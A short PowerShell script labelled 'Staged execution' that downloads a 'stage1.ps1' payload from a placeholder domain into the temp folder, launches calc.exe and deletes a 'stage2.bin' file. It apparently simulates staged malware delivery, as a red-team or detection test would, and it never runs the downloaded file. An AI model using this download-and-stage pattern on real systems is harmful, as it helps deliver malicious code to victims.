
<# Staged execution #>
[CmdletBinding()]
param(
    [string]$PayloadUrl = 'http://adatum.com/stage1.ps1',
    [string]$DownloadPath = "$env:TEMP\payload.bin",
    [int]$TimeoutSec = 70
)
Invoke-WebRequest -Uri $PayloadUrl -OutFile $DownloadPath -UseBasicParsing
Start-Process -FilePath "calc.exe"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
